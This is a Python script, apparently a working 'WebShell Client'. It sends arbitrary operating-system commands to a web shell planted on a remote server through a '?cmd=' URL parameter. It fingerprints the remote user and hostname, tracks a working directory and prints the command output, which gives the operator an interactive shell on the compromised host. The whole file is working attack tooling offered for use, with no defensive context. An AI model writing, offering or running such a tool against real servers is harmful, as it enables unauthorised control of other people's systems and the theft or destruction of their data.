import requests
import urllib.parse
import sys
import readline
import argparse
import shutil
from termcolor import colored

def send_command(command, path, base_url):
    full_command = f"cd {path} && {command}" if command != "cd" else "cd " + path
    encoded_command = urllib.parse.quote(full_command)
    url = f"{base_url}{encoded_command}"

    try:
        response = requests.get(url)
        output = response.text.strip()
        if "STDERR:" in output:
            stderr_output = output.split("STDERR:")[-1].strip()
            stdout_output = output.split("STDERR:")[0].strip()
            if stdout_output:
                print(colored(stdout_output, 'green'))
            if stderr_output:
                print(colored(stderr_output, 'red'))
        else:
            print(colored(output, 'green'))
    except requests.RequestException as e:
        print(colored(f"Error: {e}", 'red'))

def get_remote_info(base_url, command):
    encoded_command = urllib.parse.quote(command)
    url = f"{base_url}{encoded_command}"
    try:
        response = requests.get(url)
        return response.text.strip()
    except requests.RequestException as e:
        print(colored(f"Error retrieving {command}: {e}", 'red'))
        return "unknown"

def get_prompt(user, hostname, current_path):
    user = colored(user, "cyan")
    hostname = colored(hostname, "yellow")
    path = colored(current_path, "blue")
    return f"{user}@{hostname}:{path}$ "

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WebShell Client")
    parser.add_argument("url", help="Base URL of the web shell ending with '?cmd=', e.g., http://example.com/shell.php?cmd=")
    args = parser.parse_args()
    
    base_url = args.url
    if not base_url.endswith("?cmd="):
        print(colored("Error: The provided URL must end with '?cmd=' for command execution.", "red"))
        sys.exit(1)
    
    remote_user = get_remote_info(base_url, "whoami")
    remote_host = get_remote_info(base_url, "hostname")
    
    current_path = "/"
    history_file = ".shell_history"
    
    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass
    
    while True:
        try:
            command = input(get_prompt(remote_user, remote_host, current_path))
            readline.write_history_file(history_file)
        except (EOFError, KeyboardInterrupt):
            print(colored("\nExiting shell.", "red"))
            break
        
        if command.lower() in ["exit", "quit"]:
            break
        
        if command.startswith("cd "):
            new_path = command[3:].strip()
            if new_path == "..":
                current_path = "/".join(current_path.rstrip("/").split("/")[:-1]) or "/"
            elif new_path.startswith("/"):
                current_path = new_path
            else:
                current_path = f"{current_path}/{new_path}".replace("//", "/")
            continue
        
        send_command(command, current_path, base_url)